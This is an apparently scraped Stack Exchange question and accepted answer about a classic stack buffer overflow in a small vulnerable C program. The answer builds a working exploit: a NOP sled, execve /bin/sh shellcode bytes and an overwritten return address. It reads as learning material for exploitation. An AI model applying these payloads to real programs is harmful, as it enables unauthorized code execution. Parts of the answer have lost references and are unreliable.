{
  "title": "Strcpy BufferOverflow get shellcode location for EIP",
  "link": "https://reverseengineering.stackexchange.com/questions/11042/strcpy-bufferoverflow-get-shellcode-location-for-eip",
  "content": "I am trying to get a shellcode, exploiting a C program with a strcpy() function.\n\nI have found out that I need 68 bytes to start writing on the EIP. So, if I write 72's by EIP register is 0x41414141.\n\nWhat I want is to insert a 23 bytes shellcode for a x86 OS. So I know that I need this:\n\nI don't know how to carry this out. This is my program:\n\n```\n#include <stdio.h>\n#include <string.h>\n\nvoid cambiarEIP() {\n    printf(\"  \n Has cambiado el valor del EIP, enhorabuena  \n\");\n}\n\nint main(int argc, char * argv[]) {\n    char buf[64];\n\n    if(argc == 1) {\n        printf(\"Uso: %s entrada  \n\", argv[0]);\n        return -1;\n    }\n\n    strcpy(buf,argv[1]);\n    printf(\"%s  \n\", buf);\n\n    return 0;\n}\n\n```\nI want to insert this as a parameter: 45As+shellcode+EIP DIR.\n\nThis is what I get with the GDB when passing 71 bytes as a parameter:\n\n```\n Program received signal SIGSEGV, Segmentation fault.\n 0x00414141 in ?? ()\n\n```\nAnd those are my registers:\n\n```\n(gdb) i r\neax            0x0  0\necx            0xb7fbc4e0   -1208236832\nedx            0xb7fbd360   -1208233120\nebx            0xb7fbbff4   -1208238092\nesp            0xbffff4a0   0xbffff4a0\nebp            0x41414141   0x41414141\nesi            0x0  0\nedi            0x0  0\neip            0x414141 0x414141\neflags         0x10246  [ PF ZF IF RF ]\ncs             0x73 115\nss             0x7b 123\nds             0x7b 123\nes             0x7b 123\nfs             0x0  0\ngs             0x33 51\n\n```\nI know that I need something like this:\n\n```\n./shell \\x41\\*45 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n          \"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + Shellcode location\n\n```\nHow to carry this out?\n\n",
  "votes": "0",
  "answers": 1,
  "views": "4k",
  "tags": [
    "assembly",
    "gdb",
    "shellcode",
    "register"
  ],
  "user": "aDoN",
  "time": "Oct 12, 2015 at 12:34",
  "comments": [],
  "answers_data": [
    {
      "content": "NOP is the mnemonic that stands for No OPeration which is the byte \\x90, meaning that you'll have to change the A's (\\x41) for NOPs (\\x90), because \\x41 by itself it's not a valid ASM instruction in the x86 processor hence making your program crash.\n\nTaking this into account, first part goes like:\n\n```\npython -c 'print \"\\x90\"*45' > payload.bin\n\n```\nThis is self explanatory, just add your shellcode:\n\n```\npython -c 'print \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"' >> payload.bin\n\n```\nFirst ask yourself a few questions:\n\nRead this if the answer is that you don't know\n\nAnd if the answer to both of these is no then, continue to check into gdb the following\n\nNow that you have the location of your buf variable, which should be something in the form 0xbffff5f0. Now get that memory position and add it to the end of your payload. You need this position in order to jump to the location of your buf variable and execute the shellcode in it...\n\nYou still have to take endianness into account, which in your system is little endian.\n\nSo you'll need to write that memory position in little endian which, if you are lazy like me, you'll end up writing a script that makes it for you:\n\npython pyndianizer.py 0xbffff5f0 ==> \\xf0\\xf5\\xff\\xbf\n\nNow, add it to your payload\npython -c 'print \"\\xf0\\xf5\\xff\\xbf\"' >> payload.bin\n\ncat payload.bin | ./shell\n\nIf everything was done well, just press a few enters and you'll have your shell.\n\nYour shellcode runs /bin/sh but just running it doesn't work sometimes because the program ends just after running your shellcode. If so, you'll have to make it wait for user input after cating the shellcode in\n\n",
      "votes": "5",
      "user": "Community",
      "time": "Jun 17, 2020 at 9:54",
      "is_accepted": true,
      "comments": []
    }
  ]
}